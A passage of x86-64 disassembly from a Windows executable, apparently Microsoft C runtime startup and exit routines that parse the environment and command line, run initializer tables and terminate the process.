   140005e89:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140005e8d:	48 8b cb             	mov    %rbx,%rcx
   140005e90:	e8 87 2a 00 00       	call   0x14000891c
   140005e95:	8b f0                	mov    %eax,%esi
   140005e97:	85 c0                	test   %eax,%eax
   140005e99:	74 19                	je     0x140005eb4
   140005e9b:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   140005e9f:	e8 7c 20 00 00       	call   0x140007f20
   140005ea4:	48 8b cb             	mov    %rbx,%rcx
   140005ea7:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140005eab:	e8 70 20 00 00       	call   0x140007f20
   140005eb0:	8b fe                	mov    %esi,%edi
   140005eb2:	eb 3f                	jmp    0x140005ef3
   140005eb4:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   140005eb8:	48 8b cf             	mov    %rdi,%rcx
   140005ebb:	48 8b c2             	mov    %rdx,%rax
   140005ebe:	48 39 3a             	cmp    %rdi,(%rdx)
   140005ec1:	74 0c                	je     0x140005ecf
   140005ec3:	48 8d 40 08          	lea    0x8(%rax),%rax
   140005ec7:	48 ff c1             	inc    %rcx
   140005eca:	48 39 38             	cmp    %rdi,(%rax)
   140005ecd:	75 f4                	jne    0x140005ec3
   140005ecf:	89 0d cb 58 01 00    	mov    %ecx,0x158cb(%rip)        # 0x14001b7a0
   140005ed5:	33 c9                	xor    %ecx,%ecx
   140005ed7:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140005edb:	48 89 15 c6 58 01 00 	mov    %rdx,0x158c6(%rip)        # 0x14001b7a8
   140005ee2:	e8 39 20 00 00       	call   0x140007f20
   140005ee7:	48 8b cb             	mov    %rbx,%rcx
   140005eea:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140005eee:	e8 2d 20 00 00       	call   0x140007f20
   140005ef3:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140005ef8:	8b c7                	mov    %edi,%eax
   140005efa:	48 83 c4 30          	add    $0x30,%rsp
   140005efe:	41 5f                	pop    %r15
   140005f00:	41 5e                	pop    %r14
   140005f02:	5f                   	pop    %rdi
   140005f03:	5e                   	pop    %rsi
   140005f04:	5d                   	pop    %rbp
   140005f05:	c3                   	ret
   140005f06:	cc                   	int3
   140005f07:	cc                   	int3
   140005f08:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005f0d:	57                   	push   %rdi
   140005f0e:	48 83 ec 20          	sub    $0x20,%rsp
   140005f12:	33 ff                	xor    %edi,%edi
   140005f14:	48 39 3d ed 53 01 00 	cmp    %rdi,0x153ed(%rip)        # 0x14001b308
   140005f1b:	74 04                	je     0x140005f21
   140005f1d:	33 c0                	xor    %eax,%eax
   140005f1f:	eb 48                	jmp    0x140005f69
   140005f21:	e8 5a 33 00 00       	call   0x140009280
   140005f26:	e8 4d 38 00 00       	call   0x140009778
   140005f2b:	48 8b d8             	mov    %rax,%rbx
   140005f2e:	48 85 c0             	test   %rax,%rax
   140005f31:	75 05                	jne    0x140005f38
   140005f33:	83 cf ff             	or     $0xffffffff,%edi
   140005f36:	eb 27                	jmp    0x140005f5f
   140005f38:	48 8b cb             	mov    %rbx,%rcx
   140005f3b:	e8 34 00 00 00       	call   0x140005f74
   140005f40:	48 85 c0             	test   %rax,%rax
   140005f43:	75 05                	jne    0x140005f4a
   140005f45:	83 cf ff             	or     $0xffffffff,%edi
   140005f48:	eb 0e                	jmp    0x140005f58
   140005f4a:	48 89 05 cf 53 01 00 	mov    %rax,0x153cf(%rip)        # 0x14001b320
   140005f51:	48 89 05 b0 53 01 00 	mov    %rax,0x153b0(%rip)        # 0x14001b308
   140005f58:	33 c9                	xor    %ecx,%ecx
   140005f5a:	e8 c1 1f 00 00       	call   0x140007f20
   140005f5f:	48 8b cb             	mov    %rbx,%rcx
   140005f62:	e8 b9 1f 00 00       	call   0x140007f20
   140005f67:	8b c7                	mov    %edi,%eax
   140005f69:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005f6e:	48 83 c4 20          	add    $0x20,%rsp
   140005f72:	5f                   	pop    %rdi
   140005f73:	c3                   	ret
   140005f74:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005f79:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005f7e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005f83:	57                   	push   %rdi
   140005f84:	41 56                	push   %r14
   140005f86:	41 57                	push   %r15
   140005f88:	48 83 ec 30          	sub    $0x30,%rsp
   140005f8c:	4c 8b f1             	mov    %rcx,%r14
   140005f8f:	33 f6                	xor    %esi,%esi
   140005f91:	8b ce                	mov    %esi,%ecx
   140005f93:	4d 8b c6             	mov    %r14,%r8
   140005f96:	41 8a 16             	mov    (%r14),%dl
   140005f99:	eb 24                	jmp    0x140005fbf
   140005f9b:	80 fa 3d             	cmp    $0x3d,%dl
   140005f9e:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140005fa2:	48 0f 44 c1          	cmove  %rcx,%rax
   140005fa6:	48 8b c8             	mov    %rax,%rcx
   140005fa9:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140005fad:	48 ff c0             	inc    %rax
   140005fb0:	41 38 34 00          	cmp    %sil,(%r8,%rax,1)
   140005fb4:	75 f7                	jne    0x140005fad
   140005fb6:	49 ff c0             	inc    %r8
   140005fb9:	4c 03 c0             	add    %rax,%r8
   140005fbc:	41 8a 10             	mov    (%r8),%dl
   140005fbf:	84 d2                	test   %dl,%dl
   140005fc1:	75 d8                	jne    0x140005f9b
   140005fc3:	48 ff c1             	inc    %rcx
   140005fc6:	ba 08 00 00 00       	mov    $0x8,%edx
   140005fcb:	e8 d8 1e 00 00       	call   0x140007ea8
   140005fd0:	48 8b d8             	mov    %rax,%rbx
   140005fd3:	48 85 c0             	test   %rax,%rax
   140005fd6:	74 6c                	je     0x140006044
   140005fd8:	4c 8b f8             	mov    %rax,%r15
   140005fdb:	41 8a 06             	mov    (%r14),%al
   140005fde:	84 c0                	test   %al,%al
   140005fe0:	74 5f                	je     0x140006041
   140005fe2:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140005fe6:	48 ff c5             	inc    %rbp
   140005fe9:	41 38 34 2e          	cmp    %sil,(%r14,%rbp,1)
   140005fed:	75 f7                	jne    0x140005fe6
   140005fef:	48 ff c5             	inc    %rbp
   140005ff2:	3c 3d                	cmp    $0x3d,%al
   140005ff4:	74 35                	je     0x14000602b
   140005ff6:	ba 01 00 00 00       	mov    $0x1,%edx
   140005ffb:	48 8b cd             	mov    %rbp,%rcx
   140005ffe:	e8 a5 1e 00 00       	call   0x140007ea8
   140006003:	48 8b f8             	mov    %rax,%rdi
   140006006:	48 85 c0             	test   %rax,%rax
   140006009:	74 25                	je     0x140006030
   14000600b:	4d 8b c6             	mov    %r14,%r8
   14000600e:	48 8b d5             	mov    %rbp,%rdx
   140006011:	48 8b c8             	mov    %rax,%rcx
   140006014:	e8 57 0c 00 00       	call   0x140006c70
   140006019:	33 c9                	xor    %ecx,%ecx
   14000601b:	85 c0                	test   %eax,%eax
   14000601d:	75 48                	jne    0x140006067
   14000601f:	49 89 3f             	mov    %rdi,(%r15)
   140006022:	49 83 c7 08          	add    $0x8,%r15
   140006026:	e8 f5 1e 00 00       	call   0x140007f20
   14000602b:	4c 03 f5             	add    %rbp,%r14
   14000602e:	eb ab                	jmp    0x140005fdb
   140006030:	48 8b cb             	mov    %rbx,%rcx
   140006033:	e8 44 00 00 00       	call   0x14000607c
   140006038:	33 c9                	xor    %ecx,%ecx
   14000603a:	e8 e1 1e 00 00       	call   0x140007f20
   14000603f:	eb 03                	jmp    0x140006044
   140006041:	48 8b f3             	mov    %rbx,%rsi
   140006044:	33 c9                	xor    %ecx,%ecx
   140006046:	e8 d5 1e 00 00       	call   0x140007f20
   14000604b:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140006050:	48 8b c6             	mov    %rsi,%rax
   140006053:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140006058:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000605d:	48 83 c4 30          	add    $0x30,%rsp
   140006061:	41 5f                	pop    %r15
   140006063:	41 5e                	pop    %r14
   140006065:	5f                   	pop    %rdi
   140006066:	c3                   	ret
   140006067:	45 33 c9             	xor    %r9d,%r9d
   14000606a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000606f:	45 33 c0             	xor    %r8d,%r8d
   140006072:	33 d2                	xor    %edx,%edx
   140006074:	e8 c7 15 00 00       	call   0x140007640
   140006079:	cc                   	int3
   14000607a:	cc                   	int3
   14000607b:	cc                   	int3
   14000607c:	48 85 c9             	test   %rcx,%rcx
   14000607f:	74 3b                	je     0x1400060bc
   140006081:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006086:	57                   	push   %rdi
   140006087:	48 83 ec 20          	sub    $0x20,%rsp
   14000608b:	48 8b 01             	mov    (%rcx),%rax
   14000608e:	48 8b d9             	mov    %rcx,%rbx
   140006091:	48 8b f9             	mov    %rcx,%rdi
   140006094:	eb 0f                	jmp    0x1400060a5
   140006096:	48 8b c8             	mov    %rax,%rcx
   140006099:	e8 82 1e 00 00       	call   0x140007f20
   14000609e:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   1400060a2:	48 8b 07             	mov    (%rdi),%rax
   1400060a5:	48 85 c0             	test   %rax,%rax
   1400060a8:	75 ec                	jne    0x140006096
   1400060aa:	48 8b cb             	mov    %rbx,%rcx
   1400060ad:	e8 6e 1e 00 00       	call   0x140007f20
   1400060b2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400060b7:	48 83 c4 20          	add    $0x20,%rsp
   1400060bb:	5f                   	pop    %rdi
   1400060bc:	c3                   	ret
   1400060bd:	cc                   	int3
   1400060be:	cc                   	int3
   1400060bf:	cc                   	int3
   1400060c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400060c4:	48 8b 09             	mov    (%rcx),%rcx
   1400060c7:	48 3b 0d 52 52 01 00 	cmp    0x15252(%rip),%rcx        # 0x14001b320
   1400060ce:	74 05                	je     0x1400060d5
   1400060d0:	e8 a7 ff ff ff       	call   0x14000607c
   1400060d5:	48 83 c4 28          	add    $0x28,%rsp
   1400060d9:	c3                   	ret
   1400060da:	cc                   	int3
   1400060db:	cc                   	int3
   1400060dc:	48 83 ec 28          	sub    $0x28,%rsp
   1400060e0:	48 8b 09             	mov    (%rcx),%rcx
   1400060e3:	48 3b 0d 2e 52 01 00 	cmp    0x1522e(%rip),%rcx        # 0x14001b318
   1400060ea:	74 05                	je     0x1400060f1
   1400060ec:	e8 8b ff ff ff       	call   0x14000607c
   1400060f1:	48 83 c4 28          	add    $0x28,%rsp
   1400060f5:	c3                   	ret
   1400060f6:	cc                   	int3
   1400060f7:	cc                   	int3
   1400060f8:	48 83 ec 28          	sub    $0x28,%rsp
   1400060fc:	48 8d 0d 05 52 01 00 	lea    0x15205(%rip),%rcx        # 0x14001b308
   140006103:	e8 b8 ff ff ff       	call   0x1400060c0
   140006108:	48 8d 0d 01 52 01 00 	lea    0x15201(%rip),%rcx        # 0x14001b310
   14000610f:	e8 c8 ff ff ff       	call   0x1400060dc
   140006114:	48 8b 0d 05 52 01 00 	mov    0x15205(%rip),%rcx        # 0x14001b320
   14000611b:	e8 5c ff ff ff       	call   0x14000607c
   140006120:	48 8b 0d f1 51 01 00 	mov    0x151f1(%rip),%rcx        # 0x14001b318
   140006127:	48 83 c4 28          	add    $0x28,%rsp
   14000612b:	e9 4c ff ff ff       	jmp    0x14000607c
   140006130:	e9 d3 fd ff ff       	jmp    0x140005f08
   140006135:	cc                   	int3
   140006136:	cc                   	int3
   140006137:	cc                   	int3
   140006138:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000613d:	57                   	push   %rdi
   14000613e:	48 83 ec 20          	sub    $0x20,%rsp
   140006142:	e8 39 31 00 00       	call   0x140009280
   140006147:	48 8b 05 6a 56 01 00 	mov    0x1566a(%rip),%rax        # 0x14001b7b8
   14000614e:	48 8d 1d d3 51 01 00 	lea    0x151d3(%rip),%rbx        # 0x14001b328
   140006155:	48 85 c0             	test   %rax,%rax
   140006158:	48 0f 45 d8          	cmovne %rax,%rbx
   14000615c:	40 32 ff             	xor    %dil,%dil
   14000615f:	0f b6 03             	movzbl (%rbx),%eax
   140006162:	3c 20                	cmp    $0x20,%al
   140006164:	77 09                	ja     0x14000616f
   140006166:	84 c0                	test   %al,%al
   140006168:	74 30                	je     0x14000619a
   14000616a:	40 84 ff             	test   %dil,%dil
   14000616d:	74 1e                	je     0x14000618d
   14000616f:	3c 22                	cmp    $0x22,%al
   140006171:	75 07                	jne    0x14000617a
   140006173:	40 84 ff             	test   %dil,%dil
   140006176:	40 0f 94 c7          	sete   %dil
   14000617a:	8b c8                	mov    %eax,%ecx
   14000617c:	e8 af 34 00 00       	call   0x140009630
   140006181:	85 c0                	test   %eax,%eax
   140006183:	74 03                	je     0x140006188
   140006185:	48 ff c3             	inc    %rbx
   140006188:	48 ff c3             	inc    %rbx
   14000618b:	eb d2                	jmp    0x14000615f
   14000618d:	3c 20                	cmp    $0x20,%al
   14000618f:	77 09                	ja     0x14000619a
   140006191:	48 ff c3             	inc    %rbx
   140006194:	8a 03                	mov    (%rbx),%al
   140006196:	84 c0                	test   %al,%al
   140006198:	75 f3                	jne    0x14000618d
   14000619a:	48 8b c3             	mov    %rbx,%rax
   14000619d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400061a2:	48 83 c4 20          	add    $0x20,%rsp
   1400061a6:	5f                   	pop    %rdi
   1400061a7:	c3                   	ret
   1400061a8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400061ad:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400061b2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400061b7:	57                   	push   %rdi
   1400061b8:	48 83 ec 20          	sub    $0x20,%rsp
   1400061bc:	33 ed                	xor    %ebp,%ebp
   1400061be:	48 8b fa             	mov    %rdx,%rdi
   1400061c1:	48 2b f9             	sub    %rcx,%rdi
   1400061c4:	48 8b d9             	mov    %rcx,%rbx
   1400061c7:	48 83 c7 07          	add    $0x7,%rdi
   1400061cb:	8b f5                	mov    %ebp,%esi
   1400061cd:	48 c1 ef 03          	shr    $0x3,%rdi
   1400061d1:	48 3b ca             	cmp    %rdx,%rcx
   1400061d4:	48 0f 47 fd          	cmova  %rbp,%rdi
   1400061d8:	48 85 ff             	test   %rdi,%rdi
   1400061db:	74 1a                	je     0x1400061f7
   1400061dd:	48 8b 03             	mov    (%rbx),%rax
   1400061e0:	48 85 c0             	test   %rax,%rax
   1400061e3:	74 06                	je     0x1400061eb
   1400061e5:	ff 15 6d 92 00 00    	call   *0x926d(%rip)        # 0x14000f458
   1400061eb:	48 83 c3 08          	add    $0x8,%rbx
   1400061ef:	48 ff c6             	inc    %rsi
   1400061f2:	48 3b f7             	cmp    %rdi,%rsi
   1400061f5:	75 e6                	jne    0x1400061dd
   1400061f7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400061fc:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140006201:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006206:	48 83 c4 20          	add    $0x20,%rsp
   14000620a:	5f                   	pop    %rdi
   14000620b:	c3                   	ret
   14000620c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006211:	57                   	push   %rdi
   140006212:	48 83 ec 20          	sub    $0x20,%rsp
   140006216:	48 8b fa             	mov    %rdx,%rdi
   140006219:	48 8b d9             	mov    %rcx,%rbx
   14000621c:	48 3b ca             	cmp    %rdx,%rcx
   14000621f:	74 1b                	je     0x14000623c
   140006221:	48 8b 03             	mov    (%rbx),%rax
   140006224:	48 85 c0             	test   %rax,%rax
   140006227:	74 0a                	je     0x140006233
   140006229:	ff 15 29 92 00 00    	call   *0x9229(%rip)        # 0x14000f458
   14000622f:	85 c0                	test   %eax,%eax
   140006231:	75 0b                	jne    0x14000623e
   140006233:	48 83 c3 08          	add    $0x8,%rbx
   140006237:	48 3b df             	cmp    %rdi,%rbx
   14000623a:	eb e3                	jmp    0x14000621f
   14000623c:	33 c0                	xor    %eax,%eax
   14000623e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006243:	48 83 c4 20          	add    $0x20,%rsp
   140006247:	5f                   	pop    %rdi
   140006248:	c3                   	ret
   140006249:	cc                   	int3
   14000624a:	cc                   	int3
   14000624b:	cc                   	int3
   14000624c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006251:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006256:	57                   	push   %rdi
   140006257:	48 83 ec 20          	sub    $0x20,%rsp
   14000625b:	49 8b d9             	mov    %r9,%rbx
   14000625e:	49 8b f8             	mov    %r8,%rdi
   140006261:	8b 0a                	mov    (%rdx),%ecx
   140006263:	e8 70 1b 00 00       	call   0x140007dd8
   140006268:	90                   	nop
   140006269:	48 8b cf             	mov    %rdi,%rcx
   14000626c:	e8 13 00 00 00       	call   0x140006284
   140006271:	90                   	nop
   140006272:	8b 0b                	mov    (%rbx),%ecx
   140006274:	e8 b3 1b 00 00       	call   0x140007e2c
   140006279:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000627e:	48 83 c4 20          	add    $0x20,%rsp
   140006282:	5f                   	pop    %rdi
   140006283:	c3                   	ret
   140006284:	40 53                	rex push %rbx
   140006286:	48 83 ec 20          	sub    $0x20,%rsp
   14000628a:	48 8b d9             	mov    %rcx,%rbx
   14000628d:	80 3d a4 50 01 00 00 	cmpb   $0x0,0x150a4(%rip)        # 0x14001b338
   140006294:	0f 85 9f 00 00 00    	jne    0x140006339
   14000629a:	b8 01 00 00 00       	mov    $0x1,%eax
   14000629f:	87 05 87 50 01 00    	xchg   %eax,0x15087(%rip)        # 0x14001b32c
   1400062a5:	48 8b 01             	mov    (%rcx),%rax
   1400062a8:	8b 08                	mov    (%rax),%ecx
   1400062aa:	85 c9                	test   %ecx,%ecx
   1400062ac:	75 34                	jne    0x1400062e2
   1400062ae:	48 8b 05 4b 3d 01 00 	mov    0x13d4b(%rip),%rax        # 0x14001a000
   1400062b5:	8b c8                	mov    %eax,%ecx
   1400062b7:	83 e1 3f             	and    $0x3f,%ecx
   1400062ba:	48 8b 15 6f 50 01 00 	mov    0x1506f(%rip),%rdx        # 0x14001b330
   1400062c1:	48 3b d0             	cmp    %rax,%rdx
   1400062c4:	74 13                	je     0x1400062d9
   1400062c6:	48 33 c2             	xor    %rdx,%rax
   1400062c9:	48 d3 c8             	ror    %cl,%rax
   1400062cc:	45 33 c0             	xor    %r8d,%r8d
   1400062cf:	33 d2                	xor    %edx,%edx
   1400062d1:	33 c9                	xor    %ecx,%ecx
   1400062d3:	ff 15 7f 91 00 00    	call   *0x917f(%rip)        # 0x14000f458
   1400062d9:	48 8d 0d 68 50 01 00 	lea    0x15068(%rip),%rcx        # 0x14001b348
   1400062e0:	eb 0c                	jmp    0x1400062ee
   1400062e2:	83 f9 01             	cmp    $0x1,%ecx
   1400062e5:	75 0d                	jne    0x1400062f4
   1400062e7:	48 8d 0d 72 50 01 00 	lea    0x15072(%rip),%rcx        # 0x14001b360
   1400062ee:	e8 39 07 00 00       	call   0x140006a2c
   1400062f3:	90                   	nop
   1400062f4:	48 8b 03             	mov    (%rbx),%rax
   1400062f7:	83 38 00             	cmpl   $0x0,(%rax)
   1400062fa:	75 13                	jne    0x14000630f
   1400062fc:	48 8d 15 f5 91 00 00 	lea    0x91f5(%rip),%rdx        # 0x14000f4f8
   140006303:	48 8d 0d ce 91 00 00 	lea    0x91ce(%rip),%rcx        # 0x14000f4d8
   14000630a:	e8 99 fe ff ff       	call   0x1400061a8
   14000630f:	48 8d 15 f2 91 00 00 	lea    0x91f2(%rip),%rdx        # 0x14000f508
   140006316:	48 8d 0d e3 91 00 00 	lea    0x91e3(%rip),%rcx        # 0x14000f500
   14000631d:	e8 86 fe ff ff       	call   0x1400061a8
   140006322:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140006326:	83 38 00             	cmpl   $0x0,(%rax)
   140006329:	75 0e                	jne    0x140006339
   14000632b:	c6 05 06 50 01 00 01 	movb   $0x1,0x15006(%rip)        # 0x14001b338
   140006332:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140006336:	c6 00 01             	movb   $0x1,(%rax)
   140006339:	48 83 c4 20          	add    $0x20,%rsp
   14000633d:	5b                   	pop    %rbx
   14000633e:	c3                   	ret
   14000633f:	e8 0c 09 00 00       	call   0x140006c50
   140006344:	90                   	nop
   140006345:	cc                   	int3
   140006346:	cc                   	int3
   140006347:	cc                   	int3
   140006348:	33 c0                	xor    %eax,%eax
   14000634a:	81 f9 63 73 6d e0    	cmp    $0xe06d7363,%ecx
   140006350:	0f 94 c0             	sete   %al
   140006353:	c3                   	ret
   140006354:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006359:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   14000635e:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140006362:	55                   	push   %rbp
   140006363:	48 8b ec             	mov    %rsp,%rbp
   140006366:	48 83 ec 50          	sub    $0x50,%rsp
   14000636a:	8b d9                	mov    %ecx,%ebx
   14000636c:	45 85 c0             	test   %r8d,%r8d
   14000636f:	75 4a                	jne    0x1400063bb
   140006371:	33 c9                	xor    %ecx,%ecx
   140006373:	ff 15 bf 8d 00 00    	call   *0x8dbf(%rip)        # 0x14000f138
   140006379:	48 85 c0             	test   %rax,%rax
   14000637c:	74 3d                	je     0x1400063bb
   14000637e:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140006383:	66 39 08             	cmp    %cx,(%rax)
   140006386:	75 33                	jne    0x1400063bb
   140006388:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000638c:	48 03 c8             	add    %rax,%rcx
   14000638f:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140006395:	75 24                	jne    0x1400063bb
   140006397:	b8 0b 02 00 00       	mov    $0x20b,%eax
   14000639c:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400063a0:	75 19                	jne    0x1400063bb
   1400063a2:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   1400063a9:	76 10                	jbe    0x1400063bb
   1400063ab:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   1400063b2:	74 07                	je     0x1400063bb
   1400063b4:	8b cb                	mov    %ebx,%ecx
   1400063b6:	e8 a1 00 00 00       	call   0x14000645c
   1400063bb:	48 8d 45 18          	lea    0x18(%rbp),%rax
   1400063bf:	c6 45 28 00          	movb   $0x0,0x28(%rbp)
   1400063c3:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1400063c7:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   1400063cb:	48 8d 45 20          	lea    0x20(%rbp),%rax
   1400063cf:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400063d3:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400063d7:	48 8d 45 28          	lea    0x28(%rbp),%rax
   1400063db:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400063df:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   1400063e3:	b8 02 00 00 00       	mov    $0x2,%eax
   1400063e8:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   1400063ec:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   1400063ef:	89 45 d8             	mov    %eax,-0x28(%rbp)
   1400063f2:	e8 55 fe ff ff       	call   0x14000624c
   1400063f7:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   1400063fb:	74 0b                	je     0x140006408
   1400063fd:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140006402:	48 83 c4 50          	add    $0x50,%rsp
   140006406:	5d                   	pop    %rbp
   140006407:	c3                   	ret
   140006408:	8b cb                	mov    %ebx,%ecx
   14000640a:	e8 01 00 00 00       	call   0x140006410
   14000640f:	cc                   	int3
   140006410:	40 53                	rex push %rbx
   140006412:	48 83 ec 20          	sub    $0x20,%rsp
   140006416:	8b d9                	mov    %ecx,%ebx
   140006418:	e8 5f 34 00 00       	call   0x14000987c
   14000641d:	83 f8 01             	cmp    $0x1,%eax
   140006420:	74 28                	je     0x14000644a
   140006422:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   140006429:	00 00 
   14000642b:	8b 90 bc 00 00 00    	mov    0xbc(%rax),%edx
   140006431:	c1 ea 08             	shr    $0x8,%edx
   140006434:	f6 c2 01             	test   $0x1,%dl
   140006437:	75 11                	jne    0x14000644a
   140006439:	ff 15 91 8d 00 00    	call   *0x8d91(%rip)        # 0x14000f1d0
   14000643f:	48 8b c8             	mov    %rax,%rcx
   140006442:	8b d3                	mov    %ebx,%edx
   140006444:	ff 15 76 8d 00 00    	call   *0x8d76(%rip)        # 0x14000f1c0
   14000644a:	8b cb                	mov    %ebx,%ecx
   14000644c:	e8 0b 00 00 00       	call   0x14000645c
   140006451:	8b cb                	mov    %ebx,%ecx
   140006453:	ff 15 af 8d 00 00    	call   *0x8daf(%rip)        # 0x14000f208
   140006459:	cc                   	int3
   14000645a:	cc                   	int3
   14000645b:	cc                   	int3
   14000645c:	40 53                	rex push %rbx
   14000645e:	48 83 ec 20          	sub    $0x20,%rsp
   140006462:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140006468:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000646d:	8b d9                	mov    %ecx,%ebx
   14000646f:	48 8d 15 62 a1 00 00 	lea    0xa162(%rip),%rdx        # 0x1400105d8
   140006476:	33 c9                	xor    %ecx,%ecx
   140006478:	ff 15 da 8e 00 00    	call   *0x8eda(%rip)        # 0x14000f358
   14000647e:	85 c0                	test   %eax,%eax
   140006480:	74 1f                	je     0x1400064a1
   140006482:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140006487:	48 8d 15 62 a1 00 00 	lea    0xa162(%rip),%rdx        # 0x1400105f0
   14000648e:	ff 15 74 8c 00 00    	call   *0x8c74(%rip)        # 0x14000f108
   140006494:	48 85 c0             	test   %rax,%rax
   140006497:	74 08                	je     0x1400064a1
   140006499:	8b cb                	mov    %ebx,%ecx
   14000649b:	ff 15 b7 8f 00 00    	call   *0x8fb7(%rip)        # 0x14000f458
   1400064a1:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400064a6:	48 85 c9             	test   %rcx,%rcx
   1400064a9:	74 06                	je     0x1400064b1
   1400064ab:	ff 15 8f 8c 00 00    	call   *0x8c8f(%rip)        # 0x14000f140
   1400064b1:	48 83 c4 20          	add    $0x20,%rsp
   1400064b5:	5b                   	pop    %rbx
   1400064b6:	c3                   	ret
   1400064b7:	cc                   	int3
   1400064b8:	48 89 0d 71 4e 01 00 	mov    %rcx,0x14e71(%rip)        # 0x14001b330
   1400064bf:	c3                   	ret
   1400064c0:	ba 02 00 00 00       	mov    $0x2,%edx
   1400064c5:	33 c9                	xor    %ecx,%ecx
   1400064c7:	44 8d 42 ff          	lea    -0x1(%rdx),%r8d
   1400064cb:	e9 84 fe ff ff       	jmp    0x140006354
   1400064d0:	33 d2                	xor    %edx,%edx
   1400064d2:	33 c9                	xor    %ecx,%ecx
   1400064d4:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   1400064d8:	e9 77 fe ff ff       	jmp    0x140006354
   1400064dd:	cc                   	int3
   1400064de:	cc                   	int3
   1400064df:	cc                   	int3
   1400064e0:	45 33 c0             	xor    %r8d,%r8d
   1400064e3:	41 8d 50 02          	lea    0x2(%r8),%edx
   1400064e7:	e9 68 fe ff ff       	jmp    0x140006354
   1400064ec:	48 83 ec 28          	sub    $0x28,%rsp
   1400064f0:	4c 8b 05 09 3b 01 00 	mov    0x13b09(%rip),%r8        # 0x14001a000
   1400064f7:	48 8b d1             	mov    %rcx,%rdx
   1400064fa:	41 8b c0             	mov    %r8d,%eax
   1400064fd:	b9 40 00 00 00       	mov    $0x40,%ecx
   140006502:	83 e0 3f             	and    $0x3f,%eax
   140006505:	2b c8                	sub    %eax,%ecx
   140006507:	4c 39 05 22 4e 01 00 	cmp    %r8,0x14e22(%rip)        # 0x14001b330
   14000650e:	75 12                	jne    0x140006522
   140006510:	48 d3 ca             	ror    %cl,%rdx
   140006513:	49 33 d0             	xor    %r8,%rdx
   140006516:	48 89 15 13 4e 01 00 	mov    %rdx,0x14e13(%rip)        # 0x14001b330
   14000651d:	48 83 c4 28          	add    $0x28,%rsp
   140006521:	c3                   	ret
   140006522:	e8 29 07 00 00       	call   0x140006c50
   140006527:	cc                   	int3
   140006528:	45 33 c0             	xor    %r8d,%r8d
   14000652b:	33 d2                	xor    %edx,%edx
   14000652d:	e9 22 fe ff ff       	jmp    0x140006354
   140006532:	cc                   	int3
   140006533:	cc                   	int3
   140006534:	48 83 ec 28          	sub    $0x28,%rsp
   140006538:	8d 81 00 c0 ff ff    	lea    -0x4000(%rcx),%eax
   14000653e:	a9 ff 3f ff ff       	test   $0xffff3fff,%eax
   140006543:	75 12                	jne    0x140006557
   140006545:	81 f9 00 c0 00 00    	cmp    $0xc000,%ecx
   14000654b:	74 0a                	je     0x140006557
   14000654d:	87 0d 75 52 01 00    	xchg   %ecx,0x15275(%rip)        # 0x14001b7c8
   140006553:	33 c0                	xor    %eax,%eax
   140006555:	eb 15                	jmp    0x14000656c
   140006557:	e8 e4 11 00 00       	call   0x140007740
